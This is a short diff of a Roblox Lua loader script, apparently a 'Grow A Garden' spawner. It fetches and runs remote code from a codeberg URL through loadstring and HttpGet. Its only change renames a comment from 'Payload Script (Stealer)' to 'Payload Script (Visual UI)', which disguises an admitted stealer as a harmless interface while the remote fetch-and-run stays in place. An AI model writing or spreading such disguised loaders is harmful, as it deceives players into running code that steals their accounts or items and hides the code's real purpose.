@@ -199,6 +199,6 @@ Blur:Destroy()
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 UserInputService.MouseBehavior = Enum.MouseBehavior.Default
 
--- Execute Payload Script (Stealer) after loading completes
+-- Execute Payload Script (Visual UI)
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
